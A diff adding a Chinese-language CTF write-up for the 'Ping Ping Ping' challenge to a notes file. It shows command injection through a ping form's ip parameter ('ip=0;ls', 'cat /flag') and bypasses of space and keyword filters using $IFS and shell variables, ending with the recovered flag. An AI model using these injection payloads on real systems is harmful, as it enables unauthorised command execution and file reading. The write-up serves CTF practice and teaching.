@@ -131,3 +131,31 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 ## **第二种、堆叠查询**
 列出当前目录文件；列出隐藏文件；列出根目录下的文件；查看根目录下flag文件的内容<br />`127.0.0.1;ls;ls -a;ls /;cat /flag`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698201726844-14a619f6-1821-472c-ac35-9a2ee3f40d45.png#averageHue=%23f5f5f5&clientId=u90f92586-9a2e-4&from=paste&height=758&id=ufa57bd66&originHeight=948&originWidth=1063&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66837&status=done&style=none&taskId=u995fe147-fc69-4add-b6b4-fa09bff2b73&title=&width=850.4)<br />**得出flag：**<br />`**flag{ce0a3875-bc2a-49f9-b285-dccdf195531b}**`<br />两种方法可以看出有明显的不同
 
+## [GXYCTF2019]Ping Ping Ping 1
+
+题目环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698213860659-24b1340b-4b31-4179-858c-eb21e6fe7ca6.png#averageHue=%23fdfdfd&clientId=ub5d3c2c2-2e29-4&from=paste&height=80&id=u3cb957d5&originHeight=100&originWidth=194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=942&status=done&style=none&taskId=u709bb2d6-dff9-4f14-9762-6572d3ef5d6&title=&width=155.2)
+> 给了一个ip参数
+> 注意题目Ping Ping Ping
+> 意思就是让我们进行Ping地址
+> 随便输入一个地址Ping一下
+
+`URL?ip=0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698214503187-24afc92e-d4f5-44d8-9357-7ee5cc42073e.png#averageHue=%23f2f2f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=u2f328aee&originHeight=243&originWidth=509&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6638&status=done&style=none&taskId=u2b46f94e-eb00-44b7-8783-39f777d4836&title=&width=407.2)
+> 有回显结果，和上题类似
+> [[ACTF2020 新生赛]Exec 1-CSDN博客](https://blog.csdn.net/m0_73734159/article/details/134029479?spm=1001.2014.3001.5501)
+
+查看当前目录文件<br />`URL?ip=0;ls`（这里使用堆叠注入查询）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215336545-0196e2f9-1197-4aec-9d73-1d7e2291aa10.png#averageHue=%23f3f3f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=208&id=u8bb77e42&originHeight=260&originWidth=514&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11528&status=done&style=none&taskId=u7270158f-a2c2-489e-9e04-e52847199ac&title=&width=411.2)<br />直接给出了咱们flag文件，事实上真的有这么简单吗？<br />查看flag文件看看是什么情况<br />`URL?ip=0;cat flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698215574532-4eb59f0a-d7cc-4a5b-96f3-92ca289c26b1.png#averageHue=%23f4f1f0&clientId=ub5d3c2c2-2e29-4&from=paste&height=33&id=u90d497d1&originHeight=41&originWidth=286&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1795&status=done&style=none&taskId=u4cc81793-fcc6-408e-990d-ff9c9573b39&title=&width=228.8)<br />空格报错！<br />查看flag关键字是否被过滤<br />`URL?ip=0;flag.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216109157-fca1c30b-1dc9-40e2-9fde-9362e959bce4.png#averageHue=%23f6f4f2&clientId=ub5d3c2c2-2e29-4&from=paste&height=50&id=ub5b17a0d&originHeight=62&originWidth=223&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1798&status=done&style=none&taskId=ue0d0ebcc-17bb-424b-9b52-b49ae68ee50&title=&width=178.4)<br />flag报错！<br />查看字符是否被过滤<br />`URL?ip=0;/`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698216192362-6f85930f-085f-4100-aa36-0f36e2f4d802.png#averageHue=%23f5f3f1&clientId=ub5d3c2c2-2e29-4&from=paste&height=42&id=u65550639&originHeight=53&originWidth=276&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2005&status=done&style=none&taskId=u4032e5b2-9131-4d9f-b41b-270633e2eee&title=&width=220.8)<br />字符报错！<br />好啊好啊，过滤这么多东西，不过好在/符号不用绕过了，因为flag就在当前目录<br />**空格绕过**
+> 1. cat${IFS}flag.txt 
+> 2. cat$IFS$9flag.txt （正整数可以是任意）
+> 3. cat<flag.txt 
+> 4. cat<>flag.txt
+> 5.  {cat,flag.txt}
+
+**flag关键字绕过**
+> 可以使用定义变量绕过
+> $x=ag
+> fa$x=flag
+
+**构造payload：**<br />`**URL?ip=0;x=ag;cat${IFS}fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219076973-3a184aa5-455d-4a45-a589-0efebf7fb4a3.png#averageHue=%23f7f5f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=38&id=u7ebe6899&originHeight=48&originWidth=350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2073&status=done&style=none&taskId=u83d5b49d-311e-45fb-bc3b-237b51d3596&title=&width=280)<br />字符报错！<br />猜测"{}"被过滤<br />试试第二种空格绕过方法<br />**构造payload:**<br />`**URL?ip=0;x=ag;cat$IFS$1fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219718651-776f6cfd-2a1b-4bf7-a8bd-8bec0412f405.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=ube092bab&originHeight=242&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6709&status=done&style=none&taskId=u9d310f28-ddb7-4529-ab14-a89be2deda3&title=&width=457.6)<br />**有回显结果，绕过成功，但是没有发现flag，F12查看网页源代码，看看有没有flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219743590-733bf4b1-15e3-4bad-8374-3d6e45d77975.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=216&id=u3ab197a6&originHeight=270&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12592&status=done&style=none&taskId=u9dcd84a9-a474-4ab9-ad31-1246b948b85&title=&width=464.8)<br />**得出flag：**<br />`flag{08512195-033d-4f18-a5b0-00dcbc58c4b8}`
+
+
+
